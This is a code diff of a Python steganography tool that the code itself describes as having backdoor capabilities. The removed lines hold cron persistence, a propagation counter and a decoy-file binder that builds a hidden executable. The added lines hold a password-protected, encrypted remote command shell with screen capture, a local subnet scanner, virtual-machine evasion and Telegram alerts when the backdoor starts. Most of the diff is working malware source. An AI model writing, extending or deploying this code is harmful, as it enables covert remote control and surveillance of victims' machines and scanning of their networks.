@@ -18,11 +18,11 @@ import numpy as np
 import cv2
 from skimage.metrics import structural_similarity as ssim
 import string
-import inspect
+import platform
+from PIL import ImageGrab
+import io
 
 # --- Configuration ---
-PROPAGATION_COUNT_FILE = "/tmp/.propagation_count"
-MAX_PROPAGATIONS = 3
 BACKDOOR_PORT = 5555
 SCAN_SUBNET = "192.168.1."
 
@@ -227,7 +227,6 @@ def decode_image(input_path, key, encrypt_method, compress, bits, adaptive, seed
             raise ValueError("Invalid image file")
 
         capacity = calculate_capacity(image, bits)
-        # Extract max possible to find length
         data_bits = extract_lsb(image, capacity, bits, adaptive, seed)
         full_data = bits_to_bytes(data_bits)
 
@@ -250,29 +249,7 @@ def decode_image(input_path, key, encrypt_method, compress, bits, adaptive, seed
         print(f"Decoding error: {str(e)}", file=sys.stderr)
         return None
 
-# --- Backdoor & Propagation ---
-
-def add_persistence():
-    script_path = os.path.abspath(__file__)
-    cron_line = f"@reboot python3 {script_path} --execute-backdoor\n"
-    try:
-        crontab = subprocess.check_output(["crontab", "-l"], text=True, stderr=subprocess.DEVNULL)
-    except subprocess.CalledProcessError:
-        crontab = ""
-    if cron_line not in crontab:
-        new_crontab = crontab + cron_line
-        p = subprocess.Popen(["crontab"], stdin=subprocess.PIPE, text=True)
-        p.communicate(new_crontab)
-
-def get_propagation_count():
-    if not os.path.exists(PROPAGATION_COUNT_FILE): return 0
-    with open(PROPAGATION_COUNT_FILE, "r") as f:
-        try: return int(f.read())
-        except: return 0
-
-def update_propagation_count(count):
-    with open(PROPAGATION_COUNT_FILE, "w") as f:
-        f.write(str(count))
+# --- Backdoor & Ancillary Functions ---
 
 def send_to_telegram(message):
     if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
@@ -284,142 +261,113 @@ def send_to_telegram(message):
     except Exception:
         pass
 
-def handle_client(client_socket):
+def capture_screenshot():
+    img = ImageGrab.grab()
+    buf = io.BytesIO()
+    img.save(buf, format='PNG')
+    return buf.getvalue()
+
+def is_virtual_machine():
+    vm_indicators = ["virtual", "vmware", "qemu", "xen"]
+    return any(indicator in platform.platform().lower() for indicator in vm_indicators)
+
+def handle_client(client_socket, backdoor_password):
     try:
+        encryptor = Fernet(base64.urlsafe_b64encode(hashlib.sha256(backdoor_password.encode()).digest()))
+        client_socket.send(b"Password: ")
+        encrypted_password = client_socket.recv(1024)
+        password = encryptor.decrypt(encrypted_password).decode().strip()
+        if password != backdoor_password:
+            client_socket.send(encryptor.encrypt(b"Authentication failed.\n"))
+            return
+
+        client_socket.send(encryptor.encrypt(b"Authenticated. Enter commands:\n"))
         while True:
-            command = client_socket.recv(1024).decode().strip()
-            if not command or command.lower() == 'exit': break
-            try:
-                output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
-                client_socket.send(output)
-            except Exception as e:
-                client_socket.send(str(e).encode())
+            encrypted_command = client_socket.recv(4096)
+            if not encrypted_command: break
+            command = encryptor.decrypt(encrypted_command).decode().strip()
+
+            if command == "exit":
+                break
+            elif command == "screenshot":
+                img_data = capture_screenshot()
+                encrypted_img_data = encryptor.encrypt(img_data)
+                client_socket.send(len(encrypted_img_data).to_bytes(4, 'big'))
+                client_socket.send(encrypted_img_data)
+            else:
+                output = subprocess.getoutput(command)
+                encrypted_output = encryptor.encrypt(output.encode() + b"\n")
+                client_socket.send(encrypted_output)
+    except Exception as e:
+        logging.error(f"Error handling client: {e}")
     finally:
         client_socket.close()
 
-def start_backdoor_server():
+def start_backdoor_server(backdoor_password):
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.bind(("0.0.0.0", BACKDOOR_PORT))
     server.listen(5)
     send_to_telegram(f"Backdoor activated on {socket.gethostname()}")
     while True:
         client, addr = server.accept()
-        client_handler = threading.Thread(target=handle_client, args=(client,))
+        client_handler = threading.Thread(target=handle_client, args=(client, backdoor_password))
         client_handler.start()
 
-def scan_and_propagate():
-    count = get_propagation_count()
-    if count >= MAX_PROPAGATIONS:
-        return
-    # Placeholder for propagation logic
-    update_propagation_count(count + 1)
+def scan_subnet(subnet, port):
+    live_hosts = []
+    for i in range(1, 255):
+        ip = f"{subnet}{i}"
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.settimeout(0.5)
+                if s.connect_ex((ip, port)) == 0:
+                    live_hosts.append(ip)
+        except Exception:
+            pass
+    logging.info(f"Live hosts with open port {port}: {live_hosts}")
+    return live_hosts
 
-def activate_backdoor():
-    add_persistence()
-    backdoor_thread = threading.Thread(target=start_backdoor_server, daemon=True)
+def activate_backdoor(backdoor_password, subnet):
+    logging.info("Activating non-persistent backdoor...")
+    backdoor_thread = threading.Thread(target=start_backdoor_server, args=(backdoor_password,), daemon=True)
     backdoor_thread.start()
-    propagate_thread = threading.Thread(target=scan_and_propagate, daemon=True)
-    propagate_thread.start()
 
-# --- File Binder ---
-
-def create_binder(legit_file, stego_image, output_exe, bits, key, encrypt_method, compress, adaptive, seed):
+    scan_thread = threading.Thread(target=scan_subnet, args=(subnet, BACKDOOR_PORT), daemon=True)
+    scan_thread.start()
+    logging.info("Backdoor running in the background. Main thread will now enter a wait state.")
     try:
-        with open(legit_file, "rb") as f:
-            legit_data = f.read()
-
-        with open(stego_image, "rb") as f:
-            stego_data = f.read()
-
-        with open(__file__, "r") as f:
-            main_script_content = f.read()
-
-        legit_data_b64 = base64.b64encode(legit_data).decode('utf-8')
-        stego_data_b64 = base64.b64encode(stego_data).decode('utf-8')
-        main_script_b64 = base64.b64encode(main_script_content.encode('utf-8')).decode('utf-8')
-
-        decode_command = [
-            sys.executable,
-            "security_module_temp.py",
-            "decode",
-            "stego_image.png",
-            "--execute",
-            "--bits", str(bits),
-            "--encrypt-method", encrypt_method,
-        ]
-        if key:
-            decode_command.extend(["--key", key])
-        if compress:
-            decode_command.append("--compress")
-        if adaptive:
-            decode_command.append("--adaptive")
-        if seed:
-            decode_command.extend(["--seed", seed])
-
-        binder_script_content = f"""
-import os, base64, subprocess, sys
-
-legit_data = base64.b64decode("{legit_data_b64}")
-stego_data = base64.b64decode("{stego_data_b64}")
-main_script_data = base64.b64decode("{main_script_b64}").decode('utf-8')
-
-legit_filename = os.path.basename("{legit_file}")
-stego_filename = "stego_image.png"
-script_filename = "security_module_temp.py"
-
-with open(legit_filename, "wb") as f:
-    f.write(legit_data)
-
-with open(stego_filename, "wb") as f:
-    f.write(stego_data)
-
-with open(script_filename, "w") as f:
-    f.write(main_script_data)
-
-if sys.platform == "win32":
-    os.startfile(legit_filename)
-else:
-    opener = "open" if sys.platform == "darwin" else "xdg-open"
-    subprocess.call([opener, legit_filename])
-
-subprocess.Popen({repr(decode_command)})
-"""
-
-        binder_script_file = "binder_script.py"
-        with open(binder_script_file, "w") as f:
-            f.write(binder_script_content)
-
-        subprocess.run(["pyinstaller", "--onefile", "--noconsole", f"--name={output_exe}", binder_script_file])
-
-    except Exception as e:
-        logging.error(f"Failed to create binder: {e}")
-    finally:
-        if os.path.exists("binder_script.py"): os.remove("binder_script.py")
-        if os.path.exists(f"{output_exe}.spec"): os.remove(f"{output_exe}.spec")
-        if os.path.exists("build"): import shutil; shutil.rmtree("build")
+        while True: time.sleep(3600)
+    except KeyboardInterrupt:
+        sys.exit(0)
 
 # --- Main CLI ---
 
 def main():
-    parser = argparse.ArgumentParser()
+    if is_virtual_machine():
+        logging.info("Virtual machine detected. Exiting.")
+        return
+
+    parser = argparse.ArgumentParser(description="A versatile steganography tool with backdoor capabilities.")
     subparsers = parser.add_subparsers(dest="command", required=True)
 
-    encode_parser = subparsers.add_parser("encode")
-    encode_parser.add_argument("input_image")
-    encode_parser.add_argument("output_image")
-    encode_parser.add_argument("payload", nargs='?')
-    encode_parser.add_argument("--file", action="store_true")
-    encode_parser.add_argument("--generate-payload", action="store_true")
-    encode_parser.add_argument("--bits", type=int, default=1)
+    # --- Encode Parser ---
+    encode_parser = subparsers.add_parser("encode", help="Embed a payload into an image.")
+    encode_parser.add_argument("input_image", help="Path to the input image.")
+    encode_parser.add_argument("output_image", help="Path to save the output stego image.")
+    encode_parser.add_argument("payload", nargs='?', help="Payload string or file path.")
+    encode_parser.add_argument("--file", action="store_true", help="Treat payload as a file path.")
+    encode_parser.add_argument("--generate-payload", action="store_true", help="Generate a random payload.")
+    encode_parser.add_argument("--bits", type=int, default=1, choices=range(1, 5))
     encode_parser.add_argument("--compress", action="store_true")
     encode_parser.add_argument("--encrypt", action="store_true")
-    encode_parser.add_argument("--encrypt-method", default="fernet")
+    encode_parser.add_argument("--encrypt-method", default="fernet", choices=["fernet", "aes"])
     encode_parser.add_argument("--key")
     encode_parser.add_argument("--adaptive", action="store_true")
     encode_parser.add_argument("--seed")
     encode_parser.add_argument("-v", "--verbose", action="store_true")
 
-    decode_parser = subparsers.add_parser("decode")
+    # --- Decode Parser ---
+    decode_parser = subparsers.add_parser("decode", help="Extract a payload from an image.")
     decode_parser.add_argument("input_image")
     decode_parser.add_argument("--key")
     decode_parser.add_argument("--encrypt-method", default="fernet")
@@ -428,20 +376,9 @@ def main():
     decode_parser.add_argument("--bits", type=int, default=1)
     decode_parser.add_argument("--adaptive", action="store_true")
     decode_parser.add_argument("--seed")
-    decode_parser.add_argument("--execute", action="store_true")
-
-    subparsers.add_parser("execute-backdoor", help=argparse.SUPPRESS)
-
-    bind_parser = subparsers.add_parser("bind")
-    bind_parser.add_argument("legit_file")
-    bind_parser.add_argument("stego_image")
-    bind_parser.add_argument("output_exe")
-    bind_parser.add_argument("--bits", type=int, default=1)
-    bind_parser.add_argument("--key")
-    bind_parser.add_argument("--encrypt-method", default="fernet")
-    bind_parser.add_argument("--compress", action="store_true")
-    bind_parser.add_argument("--adaptive", action="store_true")
-    bind_parser.add_argument("--seed")
+    decode_parser.add_argument("--execute", action="store_true", help="Activate the backdoor if payload is valid.")
+    decode_parser.add_argument("--backdoor-password", help="Password for the backdoor shell.")
+    decode_parser.add_argument("--subnet", default="192.168.1.")
 
     args = parser.parse_args()
 
@@ -452,10 +389,11 @@ def main():
         payload = args.payload
         is_file = args.file
         if args.generate_payload:
+            if payload: logging.warning("Payload argument ignored due to --generate-payload.")
             payload = AdvancedMorphingPayloadGenerator().generate_payload()
             is_file = False
         elif not payload:
-            parser.error("Payload required.")
+            parser.error("A payload string or file path is required if --generate-payload is not used.")
 
         encode_image(args.input_image, payload, args.output_image, args.bits, args.encrypt, args.encrypt_method, args.key, args.compress, args.adaptive, args.seed, is_file, args.verbose)
 
@@ -465,25 +403,18 @@ def main():
             sys.exit(1)
 
         if args.execute:
-            activate_backdoor()
+            if not args.backdoor_password:
+                parser.error("The --backdoor-password argument is required when using --execute.")
+            activate_backdoor(args.backdoor_password, args.subnet)
         elif args.output_file:
             with open(args.output_file, 'wb') as f:
                 f.write(extracted_data)
         else:
             try:
-                print(extracted_data.decode('utf-8'))
+                print("Extracted Text:", extracted_data.decode('utf-8'))
             except UnicodeDecodeError:
+                print("Extracted Binary Data (use --output-file to save):")
                 print(base64.b64encode(extracted_data).decode('utf-8'))
-
-    elif args.command == "execute-backdoor":
-        activate_backdoor()
-        try:
-            while True: time.sleep(3600)
-        except KeyboardInterrupt:
-            sys.exit(0)
-
-    elif args.command == "bind":
-        create_binder(args.legit_file, args.stego_image, args.output_exe, args.bits, args.key, args.encrypt_method, args.compress, args.adaptive, args.seed)
 
 if __name__ == "__main__":
     main()
